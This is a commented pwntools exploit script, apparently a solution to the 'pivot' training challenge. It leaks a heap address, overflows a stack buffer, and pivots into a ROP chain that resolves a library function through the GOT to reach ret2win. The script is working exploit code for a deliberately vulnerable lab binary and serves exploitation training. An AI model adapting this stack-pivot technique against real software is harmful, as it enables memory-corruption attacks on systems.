#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *(0x{exe.symbols.pwnme:x}+164)
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 64, stdin), although the buffer is only
# 32 bytes large ...

# Just look at 'objdump -M intel -d ./pivot'. In addition to
# the usual main() calling pwnme(), you'll see the usefulGadgets()
# function containing some gadgets to divert the stack pointer.#

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)

# Parse the message to get the (leaked) address of the heap buffer.
m = re.search(r'0x([a-f0-9]+)', msg)
heapaddr = int(m.group(0), 16)

# First, we build the pivoted ROP chain, that goes into the heap buffer,
# and we send it.

# Call foothold_function() library function, so that the dynamic linker
# can do its job and fill the associated entry in the .got.plt section with
# the address of the function itself.
pivector = p64(exe.symbols["plt.foothold_function"])

# Now we can read the address of foothold_function() from the .got.plt:
#     pop rax; ret;
#     mov rax, qword ptr [rax]; ret
got_entry_addr = 0x602048
pivector += p64(0x400b00)
pivector += p64(got_entry_addr)
pivector += p64(0x400b05)

# At this point RAX contains the address of the foothold_function.
# Looking at objdump -M intel -d libpivot.so, it is easy to see that
# ret2win() is 334 bytes ahead of foothold_function(). We use more
# gadgets to add 334 to RAX.
#     pop rbp; ret;
#     add rax, rbp; ret;
pivector += p64(0x400900)
pivector += p64(334)
pivector += p64(0x400b09)

# Now we need an indirect call or jump to the address contained in
# RAX. There are no ROP gadgets in this form (e.g. terminated by
# a return instruction), but that's not required here, as the call/jump
# is the last element in the chain. We can search that with
#    $ ropper -f pivot --search='jmp'
#    jmp rax;
pivector += p64(0x4008f5)

# Send the pivoted ROP chain.
io.sendline(pivector)

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)

# Second, build the input vector to smash the stack and pivot to
# the heap buffer.

# Build the input vector as 40 arbitrary bytes plus the ROP chain,
# that will overwrite the saved RIP. We only have 3 qwords (24 bytes)
# to use for ROP.
vector = "B" * 40

# Load 'heapaddr' into RAX
#     pop rax; ret;
vector += p64(0x400b00)
vector += p64(heapaddr)

# Load RSP with the content of RAX
#     xchg rax, rsp; ret;
vector += p64(0x400b02)

# Send the input to smash the stack
io.sendline(vector)

io.interactive()
